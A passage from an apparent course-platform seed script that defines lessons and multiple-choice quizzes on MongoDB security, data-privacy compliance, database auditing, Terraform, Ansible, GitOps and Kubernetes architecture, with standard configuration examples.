              { text: 'What does a TTL index do?', answers: [{ text: 'Automatically removes documents after a specified time', isCorrect: true }, { text: 'Creates time-based reports', isCorrect: false }, { text: 'Measures query execution time', isCorrect: false }, { text: 'Tracks index usage', isCorrect: false }] },
            ],
          },
          {
            title: 'MongoDB Security',
            order: 2,
            content: `# MongoDB Security

### Learning Objectives

- Implement MongoDB authentication and authorization
- Enable encryption at rest and in transit
- Configure network security and auditing
- Apply security best practices

### Section 1: Authentication

SCRAM-SHA-256 for password authentication. x.509 certificates for certificate-based auth. LDAP integration for enterprise directories. Kerberos for cross-realm authentication.

### Section 2: Authorization

Role-based access control with built-in roles. Custom roles for fine-grained permissions. Database-level and collection-level privileges. Resource restrictions for limits.

\`\`\`javascript
// Create custom role
db.createRole({
  role: "appReadRole",
  privileges: [
    { resource: { db: "myapp", collection: "users" }, actions: ["find"] },
    { resource: { db: "myapp", collection: "posts" }, actions: ["find"] }
  ],
  roles: []
});

// Assign role to user
db.createUser({
  user: "appReader",
  pwd: "securePassword",
  roles: [{ role: "appReadRole", db: "admin" }]
});
\`\`\`

### Section 3: Encryption

Encryption at rest with WiredTiger storage engine. Network encryption with TLS/SSL. Client-side field level encryption. Key management with KMIP.

### Section 4: Auditing

Audit all authentication attempts. Track authorization decisions. Log data access patterns. Use MongoDB Enterprise auditing or Atlas auditing.

### Hands-On Practice

1. Enable SCRAM authentication and create users with appropriate roles.
2. Configure TLS encryption for client connections.
3. Set up audit logging for compliance requirements.

### Key Takeaways

- Multiple authentication methods support different environments
- Role-based authorization provides fine-grained access control
- Encryption protects data at rest and in transit
- Auditing supports compliance and forensic analysis

### References

- MongoDB Security: https://www.mongodb.com/docs/manual/security/
- MongoDB Authentication: https://www.mongodb.com/docs/manual/core/authentication/
- MongoDB Authorization: https://www.mongodb.com/docs/manual/core/authorization/`,
            questions: [
              { text: 'What is SCRAM-SHA-256?', answers: [{ text: 'Password-based authentication mechanism for MongoDB', isCorrect: true }, { text: 'An encryption algorithm', isCorrect: false }, { text: 'A backup method', isCorrect: false }, { text: 'A sharding strategy', isCorrect: false }] },
              { text: 'What does WiredTiger provide for security?', answers: [{ text: 'Encryption at rest for stored data', isCorrect: true }, { text: 'Network encryption only', isCorrect: false }, { text: 'Authentication only', isCorrect: false }, { text: 'Authorization only', isCorrect: false }] },
              { text: 'Why implement audit logging?', answers: [{ text: 'Track access patterns for compliance and forensic analysis', isCorrect: true }, { text: 'Improve query performance', isCorrect: false }, { text: 'Reduce storage costs', isCorrect: false }, { text: 'Simplify schema design', isCorrect: false }] },
              { text: 'What does custom role creation enable?', answers: [{ text: 'Fine-grained permissions tailored to application needs', isCorrect: true }, { text: 'Faster authentication', isCorrect: false }, { text: 'Simpler passwords', isCorrect: false }, { text: 'Automatic backups', isCorrect: false }] },
            ],
          },
        ],
      },
      {
        title: 'Data Compliance & Governance',
        order: 4,
        lessons: [
          {
            title: 'Data Privacy Regulations',
            order: 1,
            content: `# Data Privacy Regulations

### Learning Objectives

- Understand GDPR, CCPA, and other privacy regulations
- Implement data subject access requests
- Design systems for privacy by design
- Manage data retention and deletion requirements

### Section 1: GDPR Requirements

General Data Protection Regulation requires lawful basis for processing, data minimization, purpose limitation, and individual rights. Applies to any organization processing EU residents' data.

### Section 2: Data Subject Rights

Right to access: provide copies of personal data. Right to rectification: correct inaccurate data. Right to erasure: delete personal data. Right to portability: export data in machine-readable format.

\`\`\`python
# DSAR implementation
class DataSubjectAccessRequest:
    def __init__(self, user_id):
        self.user_id = user_id

    def process(self):
        data = {
            'profile': self.get_profile_data(),
            'activity': self.get_activity_data(),
            'preferences': self.get_preferences(),
            'consent': self.get_consent_records()
        }
        return self.export_json(data)

    def export_json(self, data):
        return json.dumps(data, indent=2, default=str)
\`\`\`

### Section 3: Privacy by Design

Data protection by design and by default. Minimize data collection. Implement purpose limitation. Use pseudonymization where possible. Default to highest privacy settings.

### Section 4: Data Retention

Define retention periods for each data category. Automate data deletion after retention periods. Document retention policies. Implement audit trails for deletion.

### Hands-On Practice

1. Implement a DSAR endpoint that exports all user data.
2. Create a data retention policy with automated deletion.
3. Design a privacy-compliant data collection form.

### Key Takeaways

- GDPR applies globally to any organization processing EU data
- Data subject rights require technical implementation
- Privacy by design reduces compliance burden
- Automated retention management prevents regulatory violations

### References

- GDPR: https://gdpr-info.eu/
- CCPA: https://oag.ca.gov/privacy/ccpa
- Privacy by Design: https://www.privacybydesign.ca/`,
            questions: [
              { text: 'What does GDPR require for data processing?', answers: [{ text: 'Lawful basis, data minimization, and purpose limitation', isCorrect: true }, { text: 'No requirements for data processing', isCorrect: false }, { text: 'Only user consent', isCorrect: false }, { text: 'Only data encryption', isCorrect: false }] },
              { text: 'What is the right to erasure?', answers: [{ text: 'The ability for individuals to request deletion of their personal data', isCorrect: true }, { text: 'The right to access data', isCorrect: false }, { text: 'The right to modify data', isCorrect: false }, { text: 'The right to share data', isCorrect: false }] },
              { text: 'What is privacy by design?', answers: [{ text: 'Building data protection into systems from the beginning', isCorrect: true }, { text: 'Adding privacy features after deployment', isCorrect: false }, { text: 'Using encryption only', isCorrect: false }, { text: 'Collecting more data', isCorrect: false }] },
              { text: 'Why automate data retention?', answers: [{ text: 'Prevent regulatory violations by deleting data after retention periods', isCorrect: true }, { text: 'Increase data collection', isCorrect: false }, { text: 'Reduce system performance', isCorrect: false }, { text: 'Simplify data structure', isCorrect: false }] },
            ],
          },
          {
            title: 'Database Auditing & Compliance',
            order: 2,
            content: `# Database Auditing & Compliance

### Learning Objectives

- Implement database audit logging
- Track data access and modifications
- Generate compliance reports
- Manage audit retention and analysis

### Section 1: Audit Logging

Log all database operations: SELECT, INSERT, UPDATE, DELETE. Track user, timestamp, affected rows, and query text. Use PostgreSQL pgAudit or MongoDB auditing.

\`\`\`sql
-- Enable pgAudit in PostgreSQL
CREATE EXTENSION pgaudit;

-- Configure audit logging
ALTER SYSTEM SET pgaudit.log = 'write, ddl, role';
ALTER SYSTEM SET pgaudit.log_catalog = on;
SELECT pg_reload_conf();
\`\`\`

### Section 2: Access Tracking

Monitor who accessed what data and when. Track privileged access. Monitor schema changes. Log connection attempts and authentication.

### Section 3: Compliance Reporting

Generate reports for SOC 2, HIPAA, PCI DSS. Prove data access controls are enforced. Document data handling procedures. Maintain evidence of compliance.

### Section 4: Audit Analysis

Analyze audit logs for anomalies. Detect unauthorized access patterns. Identify policy violations. Use automated tools for log analysis.

### Hands-On Practice

1. Enable pgAudit and configure audit logging rules.
2. Generate a compliance report from audit logs.
3. Analyze audit logs for suspicious access patterns.

### Key Takeaways

- Audit logging provides accountability for data access
- Access tracking enables forensic analysis
- Compliance reports prove regulatory adherence
- Automated analysis detects anomalies faster than manual review

### References

- pgAudit: https://www.pgaudit.org/
- MongoDB Auditing: https://www.mongodb.com/docs/manual/core/auditing/
- SOC 2: https://www.aicpa.org/interestareas/frc/assuranceadvisoryservices/aicpasoc2report.html`,
            questions: [
              { text: 'What should audit logging capture?', answers: [{ text: 'User, timestamp, query text, and affected rows for all operations', isCorrect: true }, { text: 'Only successful queries', isCorrect: false }, { text: 'Only failed queries', isCorrect: false }, { text: 'Only schema changes', isCorrect: false }] },
              { text: 'What does pgAudit provide?', answers: [{ text: 'Detailed audit logging for PostgreSQL database operations', isCorrect: true }, { text: 'Query optimization only', isCorrect: false }, { text: 'Backup management only', isCorrect: false }, { text: 'Connection pooling only', isCorrect: false }] },
              { text: 'Why analyze audit logs for anomalies?', answers: [{ text: 'Detect unauthorized access and policy violations automatically', isCorrect: true }, { text: 'To increase log volume', isCorrect: false }, { text: 'To reduce storage costs', isCorrect: false }, { text: 'To simplify database queries', isCorrect: false }] },
              { text: 'What compliance frameworks require database auditing?', answers: [{ text: 'SOC 2, HIPAA, PCI DSS, and GDPR', isCorrect: true }, { text: 'Only SOC 2', isCorrect: false }, { text: 'No frameworks require auditing', isCorrect: false }, { text: 'Only PCI DSS', isCorrect: false }] },
            ],
          },
        ],
      },
    ],
  );

  // ====================================================================
  // 8. Infrastructure as Code
  // ====================================================================
  await createCourseWithQuizzes(
    prisma,
    'Infrastructure as Code',
    'Comprehensive Infrastructure as Code course covering Terraform, Ansible, cloud provisioning, configuration management, and advanced patterns like GitOps and drift detection. Students will automate infrastructure deployment across multiple cloud providers.',
    35,
    [
      {
        title: 'IaC Fundamentals',
        order: 1,
        lessons: [
          {
            title: 'Infrastructure as Code Principles',
            order: 1,
            content: `# Infrastructure as Code Principles

### Learning Objectives

- Understand IaC benefits and challenges
- Choose between imperative and declarative approaches
- Implement version control for infrastructure
- Apply testing strategies to infrastructure code

### Section 1: IaC Benefits

IaC enables repeatable, version-controlled infrastructure. Consistency across environments. Faster provisioning. Reduced human error. Documentation as code. Self-documenting infrastructure.

### Section 2: Declarative vs Imperative

Declarative: describe desired state (Terraform, CloudFormation). Imperative: describe steps to achieve state (scripts). Declarative is generally preferred for infrastructure. Choose based on complexity and flexibility needs.

\`\`\`hcl
# Declarative (Terraform)
resource "aws_instance" "web" {
  ami           = "ami-0c55b159cbfafe1f0"
  instance_type = "t2.micro"
  tags = {
    Name = "web-server"
  }
}
\`\`\`

\`\`\`bash
# Imperative (Bash)
#!/bin/bash
aws ec2 run-instances \\
  --image-id ami-0c55b159cbfafe1f0 \\
  --instance-type t2.micro \\
  --tag-specifications 'ResourceType=instance,Tags=[{Key=Name,Value=web-server}]'
\`\`\`

### Section 3: Version Control

Store IaC in Git repositories. Tag releases for infrastructure versions. Branch for environment changes. Pull request reviews for infrastructure changes. Git history as audit trail.

### Section 4: Testing Infrastructure

Unit tests for individual resources. Integration tests for resource relationships. Plan/validate before apply. Terratest for automated testing. Compliance testing with Sentinel or OPA.

### Hands-On Practice

1. Create a Terraform configuration for a basic web server.
2. Set up version control for infrastructure code.
3. Write a basic infrastructure test using Terratest.

### Key Takeaways

- IaC provides consistency and repeatability
- Declarative approaches are generally preferred
- Version control enables audit trails and rollback
- Testing prevents infrastructure drift and errors

### References

- Terraform: https://www.terraform.io/
- Infrastructure as Code: https://www.oreilly.com/library/view/infrastructure-as-code/9781098114664/
- Terratest: https://github.com/gruntwork-io/terratest`,
            questions: [
              { text: 'What is the main benefit of declarative IaC?', answers: [{ text: 'Describe desired state without specifying implementation steps', isCorrect: true }, { text: 'Faster execution than imperative', isCorrect: false }, { text: 'Smaller file sizes', isCorrect: false }, { text: 'Better encryption', isCorrect: false }] },
              { text: 'Why version control infrastructure code?', answers: [{ text: 'Enable audit trails, rollback, and change tracking', isCorrect: true }, { text: 'To make code run faster', isCorrect: false }, { text: 'To reduce file sizes', isCorrect: false }, { text: 'To improve formatting', isCorrect: false }] },
              { text: 'What does infrastructure testing prevent?', answers: [{ text: 'Drift and errors before deployment', isCorrect: true }, { text: 'All infrastructure costs', isCorrect: false }, { text: 'Network latency', isCorrect: false }, { text: 'CPU usage', isCorrect: false }] },
              { text: 'What is the difference between declarative and imperative?', answers: [{ text: 'Declarative describes what; imperative describes how', isCorrect: true }, { text: 'They are identical', isCorrect: false }, { text: 'Declarative is always slower', isCorrect: false }, { text: 'Imperative is always simpler', isCorrect: false }] },
            ],
          },
        ],
      },
      {
        title: 'Terraform',
        order: 2,
        lessons: [
          {
            title: 'Terraform Core Concepts',
            order: 1,
            content: `# Terraform Core Concepts

### Learning Objectives

- Understand Terraform's architecture and workflow
- Write HCL configuration for cloud resources
- Manage Terraform state effectively
- Use variables, outputs, and data sources

### Section 1: Terraform Workflow

1. Write: Define infrastructure in HCL. 2. Plan: Preview changes before applying. 3. Apply: Create or modify infrastructure. 4. Destroy: Clean up resources.

\`\`\`bash
terraform init    # Initialize provider
terraform plan    # Preview changes
terraform apply   # Apply changes
terraform destroy # Clean up
\`\`\`

### Section 2: HCL Syntax

Blocks define resources. Arguments assign values. Expressions compute values. Comments document configuration.

\`\`\`hcl
# Provider configuration
provider "aws" {
  region = var.aws_region
}

# Variable definition
variable "aws_region" {
  description = "AWS region for resources"
  type        = string
  default     = "us-east-1"
}

# Resource definition
resource "aws_vpc" "main" {
  cidr_block = "10.0.0.0/16"

  tags = {
    Name        = "main-vpc"
    Environment = var.environment
  }
}

# Output definition
output "vpc_id" {
  description = "ID of the VPC"
  value       = aws_vpc.main.id
}
\`\`\`

### Section 3: State Management

State tracks resource relationships. Remote state for team collaboration. State locking prevents concurrent modifications. Import existing resources into state.

### Section 4: Data Sources

Data sources query existing infrastructure. Use for resources managed outside Terraform. Reference in other resource configurations.

### Hands-On Practice

1. Write Terraform configuration for a VPC with public and private subnets.
2. Configure remote state storage with S3 backend.
3. Use data sources to reference existing resources.

### Key Takeaways

- Terraform's workflow is write-plan-apply-destroy
- HCL provides readable infrastructure configuration
- State management is critical for team collaboration
- Data sources enable integration with existing infrastructure

### References

- Terraform Docs: https://developer.hashicorp.com/terraform/docs
- HCL Syntax: https://developer.hashicorp.com/terraform/language/syntax
- State Management: https://developer.hashicorp.com/terraform/language/state`,
            questions: [
              { text: 'What is the Terraform workflow?', answers: [{ text: 'Write, Plan, Apply, Destroy', isCorrect: true }, { text: 'Write, Commit, Push, Deploy', isCorrect: false }, { text: 'Create, Test, Release, Monitor', isCorrect: false }, { text: 'Design, Implement, Test, Document', isCorrect: false }] },
              { text: 'What does terraform plan do?', answers: [{ text: 'Preview changes before applying them to infrastructure', isCorrect: true }, { text: 'Apply changes immediately', isCorrect: false }, { text: 'Delete all resources', isCorrect: false }, { text: 'Initialize the project', isCorrect: false }] },
              { text: 'Why use remote state?', answers: [{ text: 'Enable team collaboration with shared state management', isCorrect: true }, { text: 'Make state files smaller', isCorrect: false }, { text: 'Improve local performance', isCorrect: false }, { text: 'Reduce Terraform costs', isCorrect: false }] },
              { text: 'What do data sources provide?', answers: [{ text: 'Query existing infrastructure managed outside Terraform', isCorrect: true }, { text: 'Create new resources only', isCorrect: false }, { text: 'Delete resources only', isCorrect: false }, { text: 'Modify resource tags only', isCorrect: false }] },
            ],
          },
          {
            title: 'Terraform Modules & Patterns',
            order: 2,
            content: `# Terraform Modules & Patterns

### Learning Objectives

- Create reusable Terraform modules
- Implement module composition patterns
- Use workspaces for environment management
- Apply advanced Terraform patterns

### Section 1: Module Structure

Modules encapsulate related resources. Standard directory structure: main.tf, variables.tf, outputs.tf. Modules are composable and shareable.

\`\`\`
modules/
  vpc/
    main.tf
    variables.tf
    outputs.tf
  web-server/
    main.tf
    variables.tf
    outputs.tf
\`\`\`

### Section 2: Module Composition

Modules reference other modules. Pass outputs between modules. Create complex infrastructure from simple building blocks.

\`\`\`hcl
module "vpc" {
  source = "./modules/vpc"

  cidr_block = "10.0.0.0/16"
  environment = var.environment
}

module "web_server" {
  source = "./modules/web-server"

  vpc_id     = module.vpc.vpc_id
  subnet_id  = module.vpc.public_subnet_id
  instance_type = "t2.micro"
}
\`\`\`

### Section 3: Workspaces

Workspaces manage multiple environments with same configuration. Development, staging, production. Isolated state per workspace.

### Section 4: Advanced Patterns

For-each for resource loops. Dynamic blocks for conditional resources. Moved blocks for renaming. Import for existing resources.

### Hands-On Practice

1. Create a reusable VPC module with public and private subnets.
2. Compose multiple modules to create a complete environment.
3. Use workspaces to manage dev and prod environments.

### Key Takeaways

- Modules enable reusable infrastructure components
- Module composition creates complex infrastructure from simple pieces
- Workspaces manage multiple environments with same configuration
- Advanced patterns handle complex infrastructure scenarios

### References

- Terraform Modules: https://developer.hashicorp.com/terraform/language/modules
- Module Design: https://www.terraform-best-practices.com/key-concepts
- Workspaces: https://developer.hashicorp.com/terraform/language/workspaces`,
            questions: [
              { text: 'What is the purpose of Terraform modules?', answers: [{ text: 'Encapsulate and reuse related infrastructure resources', isCorrect: true }, { text: 'Store state files', isCorrect: false }, { text: 'Manage user access', isCorrect: false }, { text: 'Monitor resource usage', isCorrect: false }] },
              { text: 'What do workspaces provide?', answers: [{ text: 'Isolated state management for multiple environments', isCorrect: true }, { text: 'Better code formatting', isCorrect: false }, { text: 'Faster apply times', isCorrect: false }, { text: 'Smaller state files', isCorrect: false }] },
              { text: 'How do modules interact?', answers: [{ text: 'Modules reference other modules and pass outputs between them', isCorrect: true }, { text: 'Modules are completely independent', isCorrect: false }, { text: 'Modules share state directly', isCorrect: false }, { text: 'Modules cannot communicate', isCorrect: false }] },
              { text: 'What is module composition?', answers: [{ text: 'Creating complex infrastructure from simple, reusable building blocks', isCorrect: true }, { text: 'Writing single large configurations', isCorrect: false }, { text: 'Using only one module per project', isCorrect: false }, { text: 'Avoiding module usage', isCorrect: false }] },
            ],
          },
        ],
      },
      {
        title: 'Ansible',
        order: 3,
        lessons: [
          {
            title: 'Ansible Playbooks',
            order: 1,
            content: `# Ansible Playbooks

### Learning Objectives

- Write Ansible playbooks for configuration management
- Use variables, loops, and conditionals
- Implement handlers and roles
- Apply Ansible best practices

### Section 1: Playbook Structure

Playbooks define desired state for managed nodes. YAML format. Tasks, handlers, variables, and roles. Idempotent execution.

\`\`\`yaml
---
- name: Configure web server
  hosts: webservers
  become: yes
  vars:
    http_port: 80
    app_root: /var/www/html

  tasks:
    - name: Install Apache
      apt:
        name: apache2
        state: present
        update_cache: yes

    - name: Configure Apache
      template:
        src: apache.conf.j2
        dest: /etc/apache2/sites-available/default.conf
      notify: Restart Apache

    - name: Ensure Apache is running
      service:
        name: apache2
        state: started
        enabled: yes

  handlers:
    - name: Restart Apache
      service:
        name: apache2
        state: restarted
\`\`\`

### Section 2: Variables and Facts

Variables customize playbooks. Ansible gathers facts automatically. Inventory variables. Play-level and task-level variables. Variable precedence.

### Section 3: Loops and Conditionals

loop iterates over lists. when adds conditional execution. register captures command output. changed_when and failed_when customize task results.

### Section 4: Handlers and Roles

Handlers execute on notify. Roles organize playbooks. Standard directory structure: tasks, handlers, templates, files, vars, defaults.

### Hands-On Practice

1. Write a playbook to configure a web server with Apache.
2. Create a role for common server hardening tasks.
3. Implement conditional tasks based on OS type.

### Key Takeaways

- Playbooks define desired state declaratively
- Ansible is agentless, using SSH for management
- Handlers execute only when notified
- Roles organize and reuse playbook components

### References

- Ansible Docs: https://docs.ansible.com/
- Playbook Guide: https://docs.ansible.com/ansible/latest/user_guide/playbooks.html
- Ansible Galaxy: https://galaxy.ansible.com/`,
            questions: [
              { text: 'What is the primary format of Ansible playbooks?', answers: [{ text: 'YAML', isCorrect: true }, { text: 'JSON', isCorrect: false }, { text: 'XML', isCorrect: false }, { text: 'HCL', isCorrect: false }] },
              { text: 'What makes Ansible agentless?', answers: [{ text: 'Uses SSH to manage nodes without installing agents', isCorrect: true }, { text: 'Does not require servers', isCorrect: false }, { text: 'Runs only locally', isCorrect: false }, { text: 'Uses API only', isCorrect: false }] },
              { text: 'When do handlers execute?', answers: [{ text: 'When notified by a task during playbook execution', isCorrect: true }, { text: 'Always before tasks', isCorrect: false }, { text: 'Never automatically', isCorrect: false }, { text: 'Only during first run', isCorrect: false }] },
              { text: 'What is the purpose of Ansible roles?', answers: [{ text: 'Organize and reuse playbook components in standard structures', isCorrect: true }, { text: 'Manage user permissions only', isCorrect: false }, { text: 'Store credentials', isCorrect: false }, { text: 'Monitor infrastructure', isCorrect: false }] },
            ],
          },
          {
            title: 'Ansible Security & Automation',
            order: 2,
            content: `# Ansible Security & Automation

### Learning Objectives

- Secure Ansible credentials and playbooks
- Implement Ansible Vault for sensitive data
- Automate complex infrastructure tasks
- Schedule Ansible automation with AWX/Tower

### Section 1: Ansible Vault

Vault encrypts sensitive variables. Encrypt entire files or individual strings. Multiple vault IDs for different environments. Integrate with HashiCorp Vault.

\`\`\`bash
# Encrypt a file
ansible-vault encrypt secrets.yml

# Encrypt a variable
ansible-vault encrypt_string 'mysecretpassword' --name 'db_password'

# Run playbook with vault
ansible-playbook site.yml --ask-vault-pass

# Use vault password file
ansible-playbook site.yml --vault-password-file ~/.vault_pass
\`\`\`

### Section 2: Security Best Practices

Minimize privilege escalation. Use --check mode for dry runs. Limit scope with tags. Audit playbook execution. Use read-only variables for sensitive data.

### Section 3: AWX/Tower

AWX provides web UI, API, and job scheduling for Ansible. Credentials management. Role-based access control. Job templates for standardized execution.

### Section 4: Complex Automation

Chain playbooks with import_playbook. Dynamic inventory from cloud providers. Callback plugins for custom logging. Ansible Galaxy for community roles.

### Hands-On Practice

1. Encrypt sensitive variables using Ansible Vault.
2. Set up AWX for centralized Ansible automation.
3. Create a job template for standardized server provisioning.

### Key Takeaways

- Ansible Vault protects sensitive data in playbooks
- Security best practices minimize risk of automation
- AWX/Tower provides enterprise automation capabilities
- Complex automation chains multiple playbooks and roles

### References

- Ansible Vault: https://docs.ansible.com/ansible/latest/vault_guide/
- AWX: https://github.com/ansible/awx
- Ansible Security: https://docs.ansible.com/ansible/latest/tips_tricks/ansible_tips_tricks.html`,
            questions: [
              { text: 'What does Ansible Vault protect?', answers: [{ text: 'Sensitive variables and data in playbooks', isCorrect: true }, { text: 'Playbook execution speed', isCorrect: false }, { text: 'Network connections', isCorrect: false }, { text: 'File system permissions', isCorrect: false }] },
              { text: 'What does AWX/Tower provide?', answers: [{ text: 'Web UI, API, job scheduling, and centralized automation', isCorrect: true }, { text: 'Only command-line execution', isCorrect: false }, { text: 'Only file storage', isCorrect: false }, { text: 'Only monitoring', isCorrect: false }] },
              { text: 'Why use --check mode?', answers: [{ text: 'Dry run playbooks to preview changes without applying them', isCorrect: true }, { text: 'Execute playbooks faster', isCorrect: false }, { text: 'Encrypt variables', isCorrect: false }, { text: 'Manage user access', isCorrect: false }] },
              { text: 'What is dynamic inventory?', answers: [{ text: 'Inventory generated from cloud provider APIs at runtime', isCorrect: true }, { text: 'Static file with host definitions', isCorrect: false }, { text: 'Database of host information', isCorrect: false }, { text: 'Manual host entry', isCorrect: false }] },
            ],
          },
        ],
      },
      {
        title: 'Advanced IaC Patterns',
        order: 4,
        lessons: [
          {
            title: 'GitOps & Continuous Delivery',
            order: 1,
            content: `# GitOps & Continuous Delivery

### Learning Objectives

- Implement GitOps workflows for infrastructure
- Use ArgoCD or Flux for Kubernetes GitOps
- Apply progressive delivery strategies
- Implement drift detection and remediation

### Section 1: GitOps Principles

Git as single source of truth for infrastructure. declarative configuration. Automated reconciliation. Continuous drift correction.

### Section 2: ArgoCD/Flux

ArgoCD provides Kubernetes-native GitOps. Sync clusters with Git repositories. Visual diff of desired vs actual state. Automated or manual sync.

\`\`\`yaml
# ArgoCD Application
apiVersion: argoproj.io/v1alpha1
kind: Application
metadata:
  name: my-app
spec:
  project: default
  source:
    repoURL: https://github.com/myorg/k8s-manifests.git
    targetRevision: main
    path: apps/my-app
  destination:
    server: https://kubernetes.default.svc
    namespace: my-app
  syncPolicy:
    automated:
      prune: true
      selfHeal: true
\`\`\`

### Section 3: Progressive Delivery

Canary deployments: gradual traffic shifting. Blue-green: instant cutover. Feature flags: code-level control. Flagger for automated progressive delivery.

### Section 4: Drift Detection

Monitor for configuration drift. Compare desired state with actual state. Automated remediation or alerting. Integration with monitoring systems.

### Hands-On Practice

1. Set up ArgoCD to sync a Kubernetes application from Git.
2. Implement canary deployment with Flagger.
3. Configure drift detection and automated remediation.

### Key Takeaways

- GitOps uses Git as the single source of truth
- Automated reconciliation ensures desired state
- Progressive delivery reduces deployment risk
- Drift detection prevents configuration inconsistencies

### References

- ArgoCD: https://argo-cd.readthedocs.io/
- Flux: https://fluxcd.io/
- Flagger: https://flagger.app/`,
            questions: [
              { text: 'What is the core principle of GitOps?', answers: [{ text: 'Git as single source of truth for infrastructure state', isCorrect: true }, { text: 'Manual configuration only', isCorrect: false }, { text: 'Using scripts for deployment', isCorrect: false }, { text: 'Direct cluster access', isCorrect: false }] },
              { text: 'What does automated reconciliation do?', answers: [{ text: 'Continuously corrects drift between desired and actual state', isCorrect: true }, { text: 'Deletes all resources', isCorrect: false }, { text: 'Creates manual backups', isCorrect: false }, { text: 'Monitors network traffic', isCorrect: false }] },
              { text: 'What is progressive delivery?', answers: [{ text: 'Gradually rolling out changes to reduce deployment risk', isCorrect: true }, { text: 'Deploying everything at once', isCorrect: false }, { text: 'Rolling back all changes', isCorrect: false }, { text: 'Disabling deployments', isCorrect: false }] },
              { text: 'What does drift detection identify?', answers: [{ text: 'Differences between desired configuration and actual infrastructure state', isCorrect: true }, { text: 'Network latency issues', isCorrect: false }, { text: 'CPU usage spikes', isCorrect: false }, { text: 'Memory leaks', isCorrect: false }] },
            ],
          },
          {
            title: 'Multi-Cloud & Hybrid IaC',
            order: 2,
            content: `# Multi-Cloud & Hybrid IaC

### Learning Objectives

- Manage infrastructure across multiple cloud providers
- Implement cloud-agnostic patterns
- Handle cross-cloud networking and security
- Optimize costs across providers

### Section 1: Multi-Cloud Strategy

Avoid vendor lock-in with cloud-agnostic tools. Use Terraform for multi-cloud provisioning. Abstract cloud-specific differences with modules.

### Section 2: Cloud-Agnostic Modules

Create modules that work across providers. Use variables for provider-specific values. Standardize interfaces across clouds.

\`\`\`hcl
# Cloud-agnostic compute module
module "web_server" {
  source = "./modules/compute"

  provider_type = var.cloud_provider  # aws, gcp, azure
  instance_type = var.instance_type
  subnet_id     = module.network.subnet_id
  tags          = var.common_tags
}
\`\`\`

### Section 3: Cross-Cloud Networking

Connect cloud providers with VPN or dedicated interconnects. DNS federation for cross-cloud service discovery. Identity federation for unified access control.

### Section 4: Cost Optimization

Compare pricing across providers. Use spot/preemptible instances. Right-size resources. Implement cost alerts.

### Hands-On Practice

1. Create a cloud-agnostic module for web server provisioning.
2. Deploy identical infrastructure to AWS and GCP.
3. Implement cross-cloud networking with VPN.

### Key Takeaways

- Cloud-agnostic tools prevent vendor lock-in
- Module abstraction simplifies multi-cloud management
- Cross-cloud networking enables hybrid architectures
- Cost optimization requires multi-cloud pricing awareness

### References

- Multi-Cloud: https://www.multicloudtoolkit.com/
- Terraform Multi-Cloud: https://developer.hashicorp.com/terraform/tutorials
- Cloud Pricing: https://infracost.io/`,
            questions: [
              { text: 'Why use cloud-agnostic modules?', answers: [{ text: 'Prevent vendor lock-in and enable multi-cloud deployments', isCorrect: true }, { text: 'Make deployments slower', isCorrect: false }, { text: 'Increase cloud costs', isCorrect: false }, { text: 'Reduce security', isCorrect: false }] },
              { text: 'What does cross-cloud networking provide?', answers: [{ text: 'Connect infrastructure across different cloud providers', isCorrect: true }, { text: 'Only local network connections', isCorrect: false }, { text: 'Only internet access', isCorrect: false }, { text: 'Only DNS management', isCorrect: false }] },
              { text: 'What is the benefit of multi-cloud cost optimization?', answers: [{ text: 'Compare pricing and use the most cost-effective provider for each workload', isCorrect: true }, { text: 'Increase spending across all clouds', isCorrect: false }, { text: 'Eliminate all cloud costs', isCorrect: false }, { text: 'Use only one cloud provider', isCorrect: false }] },
              { text: 'How do you standardize interfaces across clouds?', answers: [{ text: 'Create modules with standardized variable and output definitions', isCorrect: true }, { text: 'Use cloud-specific APIs only', isCorrect: false }, { text: 'Write unique scripts for each cloud', isCorrect: false }, { text: 'Avoid using modules', isCorrect: false }] },
            ],
          },
        ],
      },
    ],
  );

  // ====================================================================
  // 9. Kubernetes Administration & Security
  // ====================================================================
  await createCourseWithQuizzes(
    prisma,
    'Kubernetes Administration & Security',
    'Comprehensive Kubernetes course covering cluster administration, networking, security with RBAC and policies, monitoring, and troubleshooting. Students will manage production Kubernetes clusters with security-first operations.',
    35,
    [
      {
        title: 'Kubernetes Fundamentals',
        order: 1,
        lessons: [
          {
            title: 'Cluster Architecture',
            order: 1,
            content: `# Cluster Architecture

### Learning Objectives

- Understand Kubernetes control plane components
- Explain worker node architecture
- Manage etcd cluster state
- Design high-availability clusters

### Section 1: Control Plane

The control plane manages the cluster. API Server: central management entity. Scheduler: assigns pods to nodes. Controller Manager: maintains desired state. etcd: distributed key-value store for cluster state.

### Section 2: Worker Nodes

Worker nodes run application workloads. Kubelet: node agent managing pods. Kube-proxy: network proxy for service routing. Container runtime: Docker, containerd, or CRI-O.

\`\`\`
Control Plane:
  - API Server (kubectl talks to this)
  - Scheduler (places pods on nodes)
  - Controller Manager (reconciliation loops)
  - etcd (cluster state storage)

Worker Nodes:
  - Kubelet (manages pods)
  - Kube-proxy (network routing)
  - Container Runtime (runs containers)
\`\`\`

### Section 3: etcd

etcd stores all cluster state. Distributed consensus with Raft. Backup and restore critical for disaster recovery. Encryption at rest for sensitive data.

### Section 4: High Availability

Multiple control plane nodes. Load balancer in front of API servers. Stacked or external etcd topology. Worker node distribution across failure domains.

### Hands-On Practice

1. Inspect control plane components with kubectl.
2. Back up and restore etcd.
3. Design a high-availability cluster topology.

### Key Takeaways

- Control plane manages cluster state and scheduling
- Worker nodes run application workloads
- etcd is the single source of truth for cluster state
- HA design prevents single points of failure

### References

- Kubernetes Architecture: https://kubernetes.io/docs/concepts/overview/components/
- etcd Documentation: https://etcd.io/docs/
- HA Kubernetes: https://kubernetes.io/docs/setup/production-environment/tools/`,
            questions: [
              { text: 'What does the Kubernetes API Server do?', answers: [{ text: 'Central management entity that handles all API requests', isCorrect: true }, { text: 'Runs application containers', isCorrect: false }, { text: 'Stores application data', isCorrect: false }, { text: 'Manages network traffic', isCorrect: false }] },
              { text: 'What is etcd?', answers: [{ text: 'Distributed key-value store for cluster state', isCorrect: true }, { text: 'Container runtime', isCorrect: false }, { text: 'Network proxy', isCorrect: false }, { text: 'Log aggregator', isCorrect: false }] },
              { text: 'What does Kubelet do?', answers: [{ text: 'Node agent that manages pods and containers on each node', isCorrect: true }, { text: 'Routes network traffic', isCorrect: false }, { text: 'Stores cluster configuration', isCorrect: false }, { text: 'Schedules pods across nodes', isCorrect: false }] },
              { text: 'Why use multiple control plane nodes?', answers: [{ text: 'Prevent single point of failure and ensure high availability', isCorrect: true }, { text: 'Increase storage capacity', isCorrect: false }, { text: 'Reduce network latency', isCorrect: false }, { text: 'Simplify configuration', isCorrect: false }] },
            ],
          },
          {
